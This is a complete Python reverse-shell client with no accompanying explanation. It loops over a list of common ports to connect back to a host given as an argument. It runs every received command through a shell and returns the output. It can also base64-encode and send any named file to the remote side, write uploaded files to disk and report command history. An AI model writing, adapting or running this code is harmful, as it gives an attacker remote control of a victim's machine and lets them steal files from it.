import socket, time, base64, sys
from subprocess import Popen, PIPE

history = []
working = True

def download(_client):
    _client.send("Filename: ".encode())
    file = _client.recv(4096).decode().strip()
    try:
        with open(file, 'rb') as opened_file:
            data = f'\n{"=" * 77}# START #{"=" * 77}\n\n'.encode() + \
                   base64.b64encode(opened_file.read()) + f'\n\n{"=" * 77}# END #{"=" * 77}\n'.encode()
            _client.send(data)
    except Exception as e:
        _client.send(str(e).encode())


def upload(_client):
    try:
        _client.send("Filename: ".encode())
        file = _client.recv(4096).decode().strip()
        _client.send("EOL: ".encode())
        eol = _client.recv(4096).decode()
        data = b""
        while not data.endswith(eol.encode()):
            data += _client.recv(4096)
        data = base64.b64decode(data).decode()
        with open(file, 'w') as write_file:
            write_file.write(data)
    except Exception as e:
        _client.send(str(e).encode())
def open_shell(_client):
    while True:
        try:
            command = _client.recv(4096).decode()
            if command == '':
                break
            elif command == '_DOWNLOAD_\n':
                download(_client)
            elif command == '_UPLOAD_\n':
                upload(_client)
            elif command == '_HISTORY_\n':
                hist = ''
                for cmd in history:
                    hist += cmd
                _client.send(hist.encode())
            elif command == '_YOU\'RE-DONE_\n':
                _client.send("Bi".encode())
                sys.exit(0)
            else:
                process = Popen(command,
                                shell=True,
                                stdin=PIPE,
                                stdout=PIPE,
                                stderr=PIPE)
                result, error = process.communicate()

                _client.send(result)
                if error:
                    _client.send(error)
        except socket.error:
            break
        except Exception as e:
            _client.send(bytes(str(e), 'utf-8'))
        finally:
            history.append(command)


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ports_to_try = [8000, 1234, 12345, 8081, 8080, 81, 80, 443, 9000, 10000, 8082, 8083, 45690, 50984, 32980]
def main():
    while working:
        for port in ports_to_try:
            try:
                client.connect((sys.argv[1], port))
            except Exception as e:
                time.sleep(1)
                continue
            else:
                open_shell(client)
                break

main()